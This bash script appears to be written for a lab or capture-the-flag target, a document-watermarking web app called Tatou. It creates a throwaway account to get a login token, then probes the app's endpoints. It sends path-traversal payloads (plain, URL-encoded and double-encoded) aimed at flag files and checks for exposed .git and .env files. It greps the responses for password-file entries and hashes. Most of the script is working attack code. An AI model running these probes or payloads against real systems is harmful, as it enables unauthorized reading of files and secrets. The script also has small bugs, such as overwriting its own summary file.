#!/usr/bin/env bash
# test_all_endpoints.sh
# Try all known endpoints from server.py
# Usage: ./test_all_endpoints.sh <TARGET_IP> <PORT>
# Example: ./test_all_endpoints.sh 10.11.12.17 5000

set -euo pipefail

if [ "$#" -lt 2 ]; then
  echo "Usage: $0 <TARGET_IP> <PORT> [--no-create-user]"
  exit 1
fi

TARGET=$1
PORT=$2
NO_CREATE_USER=false
if [ "${3:-}" = "--no-create-user" ]; then
  NO_CREATE_USER=true
fi

BASE="http://${TARGET}:${PORT}"
OUTDIR="all_endpoints_results/${TARGET}_${PORT}"
mkdir -p "${OUTDIR}"

echo "[*] Running endpoint tests against ${BASE}"
date > "${OUTDIR}/run_timestamp.txt"
echo "Target: ${BASE}" >> "${OUTDIR}/run_timestamp.txt"

# helper to save output
save() {
  local name="$1"; shift
  echo "---- ${name} ----" > "${OUTDIR}/${name}.txt"
  "$@" >> "${OUTDIR}/${name}.txt" 2>&1 || true
}

summary_append() {
  echo "$1" >> "${OUTDIR}/summary.txt"
}

# 1) Basic root & health
save "root_index" curl -sS -i "${BASE}/" || true
save "healthz" curl -sS -i "${BASE}/healthz" || true

# 2) Public API endpoints from server.py (GET/POST)
PUBLIC_GETS=(
  "/api/get-watermarking-methods"
  "/api/list-all-versions"
)
for e in "${PUBLIC_GETS[@]}"; do
  safe=$(echo "${e}" | sed 's#/#_#g')
  save "get${safe}" curl -sS -i "${BASE}${e}" || true
done

# endpoints that fetch files / static
save "static_root" curl -sS -i "${BASE}/static/" || true
save "static_test_file" curl -sS -i "${BASE}/static/test" || true

# check Apache side on :8080 (if present)
save "apache_root_8080" curl -sS -i "http://${TARGET}:8080/" || true
save "apache_tatou_flag" curl -sS -i "http://${TARGET}:8080/tatou/flag" || true
save "apache_git_HEAD" curl -sS -i "http://${TARGET}:8080/.git/HEAD" || true
save "apache_git_config" curl -sS -i "http://${TARGET}:8080/.git/config" || true

# 3) Try create-user (optional) and login to obtain a token for auth-required endpoints
RANDOM_ID=$(date +%s)
TMP_EMAIL="testuser${RANDOM_ID}@example.local"
TMP_LOGIN="testuser${RANDOM_ID}"
TMP_PASS="Passw0rd!${RANDOM_ID}"
TOKEN=""

if [ "$NO_CREATE_USER" = false ]; then
  echo "[*] Attempting to create test user: ${TMP_LOGIN} / ${TMP_EMAIL}"
  save "create_user" curl -sS -i -X POST "${BASE}/api/create-user" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${TMP_EMAIL}\",\"login\":\"${TMP_LOGIN}\",\"password\":\"${TMP_PASS}\"}" || true

  # Try login to get token
  save "login" curl -sS -i -X POST "${BASE}/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${TMP_EMAIL}\",\"password\":\"${TMP_PASS}\"}" || true

  # extract token if login succeeded (from saved file)
  tok=$(grep -Eo '"token"[[:space:]]*:[[:space:]]*"[^"]+"' "${OUTDIR}/login.txt" || true)
  if [ -n "$tok" ]; then
    TOKEN=$(echo "$tok" | sed 's/.*"token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/')
    echo "[*] Obtained token (length ${#TOKEN})"
    echo "$TOKEN" > "${OUTDIR}/token.txt"
    summary_append "Obtained token from login - saved to token.txt"
  else
    summary_append "No token obtained from login (login likely failed). Check ${OUTDIR}/login.txt"
  fi
else
  summary_append "Skipped creating test user (--no-create-user)"
fi

# 4) Auth-required endpoints list (we will try them with token if available)
AUTH_ENDPOINTS=(
  "/api/upload-document"          # POST (multipart)
  "/api/list-documents"           # GET
  "/api/get-document/1"           # GET FILE
  "/api/list-versions/1"          # GET
  "/api/create-watermark"         # POST
  "/api/read-watermark"           # POST
  "/api/delete-document/1"        # DELETE (we will NOT invoke DELETE; we only test GET/HEAD)
)

# 4a) If token present, set header
AUTH_HEADER=()
if [ -n "${TOKEN}" ]; then
  AUTH_HEADER=(-H "Authorization: Bearer ${TOKEN}")
fi

# 4b) Test GET/HEAD variants for auth endpoints (non-destructive)
for e in "${AUTH_ENDPOINTS[@]}"; do
  safe=$(echo "${e}" | sed 's#/#_#g')
  if [[ "$e" == *"upload-document"* ]]; then
    # attempt a harmless upload (PDF dummy)
    tmpf="$(mktemp /tmp/testpdf.XXXXXX).pdf"
    echo "%PDF-1.4\n%Dummy PDF" > "$tmpf"
    echo "[*] Testing upload endpoint (non-executable test file)"
    save "upload_test" curl -sS -i "${AUTH_HEADER[@]}" -X POST "${BASE}/api/upload-document" -F "file=@${tmpf}" -F "name=test.pdf" || true
    rm -f "$tmpf"
  else
    echo "[*] Testing auth endpoint (GET/POST safe) ${e}"
    save "auth${safe}_GET" curl -sS -i "${AUTH_HEADER[@]}" "${BASE}${e}" || true
    # try POST with empty JSON for endpoints likely to accept JSON
    save "auth${safe}_POST" curl -sS -i "${AUTH_HEADER[@]}" -X POST -H "Content-Type: application/json" -d "{}" "${BASE}${e}" || true
  fi
done

# 5) File-serving endpoints that may return files via a link token
# Probe get-version/<link> with some dummy links and traversal
LINK_TESTS=("abc123" "nonexistent" "%2e%2e%2f%2e%2e%2fapp%2fflag")
for l in "${LINK_TESTS[@]}"; do
  save "getversion_${l}" curl -sS -i "${BASE}/api/get-version/${l}" || true
done

# 6) RMAP endpoints (if implemented)
save "rmap_initiate" curl -sS -i -X POST "${BASE}/api/rmap-initiate" -H "Content-Type: application/json" -d '{"payload":"test"}' || true
save "rmap_get_link" curl -sS -i -X POST "${BASE}/api/rmap-get-link" -H "Content-Type: application/json" -d '{"payload":"test"}' || true

# 7) Try common traversal patterns on static and get-version endpoints (non-destructive read only)
traversals=(
  "../../../../app/flag"
  "../../../../../tatou/flag"
  "%2e%2e/%2e%2e/%2e%2e/%2e%2e/app/flag"
  "%252e%252e/%252e%252e/%252e%252e/%252e%252e/app/flag"
)
for t in "${traversals[@]}"; do
  save "static_tr_${t//\//_}" curl -sS -i "${BASE}/static/${t}" || true
  save "getver_tr_${t//\//_}" curl -sS -i "${BASE}/api/get-version/${t}" || true
done

# 8) Check for repository artifacts on web root (typical)
save "web_dotgit_HEAD" curl -sS -i "${BASE}/.git/HEAD" || true
save "web_dotenv" curl -sS -i "${BASE}/.env" || true
save "web_readme" curl -sS -i "${BASE}/README.md" || true

# 9) Summarize interesting strings (basic grep)
echo "Summary of likely hits (searching for root:, password-like, 40-hex sha1 etc)" > "${OUTDIR}/summary.txt"
for f in "${OUTDIR}"/*.txt; do
  if grep -E -q "root:|www-data|daemon:|[a-f0-9]{40}" "$f"; then
    echo "POTENTIAL: $f" >> "${OUTDIR}/summary.txt"
    grep -E --line-number "root:|www-data|daemon:|[a-f0-9]{40}" "$f" >> "${OUTDIR}/summary.txt" || true
  fi
done

echo "[*] Done. Results saved to ${OUTDIR}"
echo "Open ${OUTDIR}/summary.txt for quick findings."

